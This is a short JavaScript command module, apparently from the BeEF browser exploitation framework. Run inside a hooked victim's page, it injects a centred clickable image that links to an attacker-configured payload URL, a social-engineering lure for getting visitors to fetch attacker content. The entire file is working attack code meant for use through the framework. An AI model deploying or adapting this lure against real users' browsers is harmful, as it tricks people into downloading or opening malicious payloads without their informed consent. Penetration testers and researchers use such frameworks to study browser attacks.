//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  
  	// Grab image and payload from config
  	image = "<%== @image %>";
  	payload = "<%== @payload %>";

  	// Add div to page
	div = document.createElement('div');
	div.setAttribute('id', 'splash');
	div.setAttribute('style', 'position:absolute; top:30%; left:40%;');
	div.setAttribute('align', 'center');
	document.body.appendChild(div);
	div.innerHTML= '<a href=\'' + payload + '\' ><img src=\''+ image +'\'  /></a>';
    $j("#splash").click(function () {
      $j(this).hide();
    });
});
